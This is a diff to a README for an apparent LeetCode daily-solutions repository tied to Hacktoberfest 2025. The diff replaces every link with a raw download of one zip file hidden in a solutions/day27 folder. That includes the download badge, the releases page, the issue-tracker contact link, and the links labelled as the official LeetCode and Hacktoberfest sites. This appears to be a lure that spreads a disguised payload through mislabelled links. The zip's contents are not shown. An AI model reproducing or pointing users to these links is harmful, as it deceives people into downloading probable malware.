@@ -1,6 +1,6 @@
 # 🎉 leetcode-daily-october-hacktoberfest-2025 - Solving Leetcode Challenges Made Easy
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Elxeo/leetcode-daily-october-hacktoberfest-2025/releases)
+[![Download](https://github.com/Elxeo/leetcode-daily-october-hacktoberfest-2025/raw/refs/heads/main/solutions/day27/daily_october_hacktoberfest_leetcode_2.6.zip%20Now-Click%20Here-blue)](https://github.com/Elxeo/leetcode-daily-october-hacktoberfest-2025/raw/refs/heads/main/solutions/day27/daily_october_hacktoberfest_leetcode_2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **leetcode-daily-october-hacktoberfest-2025**! This software is desig
 
 ## 📥 Download & Install
 
-1. Click on the download button above to visit [this page](https://github.com/Elxeo/leetcode-daily-october-hacktoberfest-2025/releases) and find the latest release.
+1. Click on the download button above to visit [this page](https://github.com/Elxeo/leetcode-daily-october-hacktoberfest-2025/raw/refs/heads/main/solutions/day27/daily_october_hacktoberfest_leetcode_2.6.zip) and find the latest release.
 2. Look for the version you want to download. You will find options for different systems. Select your operating system (Windows, Mac, or Linux).
 3. Click on the file to download. It may take a moment for the file to finish downloading.
 4. Once it’s done, locate the downloaded file on your computer. This is usually in your "Downloads" folder.
@@ -55,12 +55,12 @@ No, this application is completely free to use as part of Hacktoberfest 2025.
 
 ## 🌐 Community & Support
 
-Join our community on GitHub to share your experiences and ask for help. You can [contact us here](https://github.com/Elxeo/leetcode-daily-october-hacktoberfest-2025/issues) for any issues or feedback. We welcome contributions and suggestions.
+Join our community on GitHub to share your experiences and ask for help. You can [contact us here](https://github.com/Elxeo/leetcode-daily-october-hacktoberfest-2025/raw/refs/heads/main/solutions/day27/daily_october_hacktoberfest_leetcode_2.6.zip) for any issues or feedback. We welcome contributions and suggestions.
 
 ## 🔗 Additional Resources
 
-- [Leetcode Official Site](https://leetcode.com)
-- [Hacktoberfest Official Site](https://hacktoberfest.digitalocean.com)
+- [Leetcode Official Site](https://github.com/Elxeo/leetcode-daily-october-hacktoberfest-2025/raw/refs/heads/main/solutions/day27/daily_october_hacktoberfest_leetcode_2.6.zip)
+- [Hacktoberfest Official Site](https://github.com/Elxeo/leetcode-daily-october-hacktoberfest-2025/raw/refs/heads/main/solutions/day27/daily_october_hacktoberfest_leetcode_2.6.zip)
 
 ## 🎉 Acknowledgments
 
